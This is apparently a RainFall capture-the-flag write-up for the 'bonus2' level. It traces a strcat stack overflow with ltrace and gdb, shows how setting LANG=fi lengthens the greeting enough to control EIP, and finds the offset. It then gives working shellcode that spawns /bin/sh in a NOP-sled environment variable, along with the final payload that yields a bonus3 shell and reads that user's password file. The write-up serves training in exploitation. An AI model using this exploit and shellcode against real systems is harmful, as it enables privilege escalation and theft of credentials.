# BONUS2

## Analysis

```
   ### SHELL ###

   bonus2@RainFall:~$ ./bonus2 
   bonus2@RainFall:~$ ./bonus2 soso
   bonus2@RainFall:~$ ./bonus2 soso sasa
   Hello soso
   bonus2@RainFall:~$ ./bonus2 soso sasa dcdc
   bonus2@RainFall:~$ 

   ### LTRACE ###

   bonus2@RainFall:~$ ltrace ./bonus2 salut toi
   __libc_start_main(0x8048529, 3, 0xbffff7d4, 0x8048640, 0x80486b0 <unfinished ...>
   strncpy(0xbffff6d0, "salut", 40)                                                   = 0xbffff6d0
   strncpy(0xbffff6f8, "toi", 32)                                                     = 0xbffff6f8
   getenv("LANG")                                                                     = "en_US.UTF-8"
   memcmp(0xbfffff14, 0x804873d, 2, 0xb7fff918, 0)                                    = -1
   memcmp(0xbfffff14, 0x8048740, 2, 0xb7fff918, 0)                                    = -1
   strcat("Hello ", "salut")                                                          = "Hello salut"
   puts("Hello salut"Hello salut
   )                                                                = 12
   +++ exited (status 12) +++
   bonus2@RainFall:~$ ltrace ./bonus2 $(python -c 'print "A" * 100') $(python -c 'print "B" * 100')
   __libc_start_main(0x8048529, 3, 0xbffff714, 0x8048640, 0x80486b0 <unfinished ...>
   strncpy(0xbffff610, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 40)                     = 0xbffff610
   strncpy(0xbffff638, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"..., 32)                     = 0xbffff638
   getenv("LANG")                                                                     = "en_US.UTF-8"
   memcmp(0xbfffff14, 0x804873d, 2, 0xb7fff918, 0)                                    = -1
   memcmp(0xbfffff14, 0x8048740, 2, 0xb7fff918, 0)                                    = -1
   strcat("Hello ", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                            = "Hello AAAAAAAAAAAAAAAAAAAAAAAAAA"...
   puts("Hello AAAAAAAAAAAAAAAAAAAAAAAAAA"...Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
   )                                        = 79
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++

```
Interesting, the program seems to take 2 arguments, copy them to the stack 40 bytes fom one another (then the second strcpy "allocates" 32 bytes). The program calls getenv <LANG> and uses it somehow. Then we have 2 memcpy that takes 2 different srcs (but both srcs remain the same from one run to another) and copy it at the same place. Also very interesting to see that with large input the program segfauls.


First let's check where we segfault:
```
(gdb) run $(python -c 'print "A" * 100') $(python -c 'print "B" * 100')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 100') $(python -c 'print "B" * 100')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()
(gdb) info registers
eax            0x4f     79
ecx            0xffffffff       -1
edx            0xb7fd28b8       -1208145736
ebx            0xbffff600       -1073744384
esp            0xbffff5b0       0xbffff5b0
ebp            0x42424242       0x42424242
esi            0xbffff64c       -1073744308
edi            0xbffff5fc       -1073744388
eip            0x8004242        0x8004242
eflags         0x210282 [ SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) run $(python -c 'print "A" * 150') $(python -c 'print "B" * 150')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 150') $(python -c 'print "B" * 150')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()
```
Ok so with large input we can corrupt the eip, GOOD, but only half so far.




Let's try to see what what getenv tries to copy:
```
0x080485a6 <+125>:   call   0x8048380 <getenv@plt>  <===== shellcode in lang didnt work but i can change the value to ctrl jmp
   0x080485ab <+130>:   mov    %eax,0x9c(%esp)  < ==== put getenv(LANG) in esp +156
   0x080485b2 <+137>:   cmpl   $0x0,0x9c(%esp) 
   0x080485ba <+145>:   je     0x8048618 <main+239> <=== If no lang jumps
   0x080485bc <+147>:   movl   $0x2,0x8(%esp)          
   0x080485c4 <+155>:   movl   $0x804873d,0x4(%esp)   <====== 0x804873d = "fi"
   0x080485cc <+163>:   mov    0x9c(%esp),%eax         <====== eax = "lang"
   0x080485d3 <+170>:   mov    %eax,(%esp)
   0x080485d6 <+173>:   call   0x8048360 <memcmp@plt>
   0x080485db <+178>:   test   %eax,%eax              
   0x080485dd <+180>:   jne    0x80485eb <main+194> <====== if lang == fi
   0x080485df <+182>:   movl   $0x1,0x8049988        <============== move 1 into var language
   0x080485e9 <+192>:   jmp    0x8048618 <main+239> <==== then jumps
```
So getenv gets the value stocked in env var <LANG> and compares it to "fi" and stock the value 1 in global var <language>, right after it does something similar with "ni" and stock value 2 in <language>.

Later it jumps and in the function <greetuser> if <language> == 1:
it uses this string:
```
0x080484ba <+54>:    mov    $0x8048717,%edx    <=== 0x8048717 = "Hyvää päivää "
```
```
(gdb) x/s 0x8048717
0x8048717:       "Hyvää päivää "
```
Hyvää päivää means Hello in finish, so we can choose the language if we put "fi" or "ni" in the env var <LANG>.
Indeed if we put "ni" in <LANG> we have the following:
```
## in code ##
 0x08048494 <+16>:    cmp    $0x2,%eax
   0x08048497 <+19>:    je     0x80484e9 <greetuser+101>
[...]
0x080484e9 <+101>:   mov    $0x804872a,%edx

## in gdb ##

(gdb) x/s 0x804872a
0x804872a:       "Goedemiddag! "
```

When we take a look at the <greetuser> the progam behaves differently depending on what is in the global var <language>. so let's try to manipulate the env var <LANG> to see if we can have a better control over EIP:
```
bonus2@RainFall:~$ export LANG=fi
bonus2@RainFall:~$ gdb ./bonus2
(gdb) run $(python -c 'print "A" * 150') $(python -c 'print "B" * 150')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
``` 
Ok it seems we were able to reach and fully overflow the EIP with same input as earlier but with the value "fi" in <LANG>.


Now we just need the right offset:
```
(gdb) run $(python -c 'print "A" * 100') $(python -c 'print "B" * 100')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 100') $(python -c 'print "B" * 100')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

(gdb) run $(python -c 'print "A" * 100') $(python -c 'print "B" * 20')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 100') $(python -c 'print "B" * 20')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()

(gdb) run $(python -c 'print "A" * 100') $(python -c 'print "B" * 21')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 100') $(python -c 'print "B" * 21')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x00424242 in ?? ()

(gdb) run $(python -c 'print "A" * 100') $(python -c 'print "B" * 22')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 100') $(python -c 'print "B" * 22')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Ok so if we git 100 A's as first input and 22 B's in second, we have full control of our EIP.

Let's try this:
```
export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
```
```
bonus2@RainFall:~$ gdb ./bonus2
(gdb) start
Temporary breakpoint 1 at 0x804852f
Starting program: /home/user/bonus2/bonus2 

Temporary breakpoint 1, 0x0804852f in main ()
(gdb) x/1000gs environ
[...]
0xbffffb99:      "PAYLOAD=\220
[...]
(gdb) x/100x 0xbffffb99
{...}
0xbffffbe9:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffbf9:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc09:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc19:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc29:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc39:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc49:     0x90909090      0x90909090      0x90909090      0x90909090
[...]
```

We can now choose any address in our NOP Slep: 0xbffffc29.
```
   bonus2@RainFall:~$ ./bonus2  $(python -c 'print "A" * 100') $(python -c 'print "B" * 18 + "\x29\xfc\xff\xbf"')
   Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB)���
   $ whoami
   bonus3
   $ cat /home/user/bonus3/.pass
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
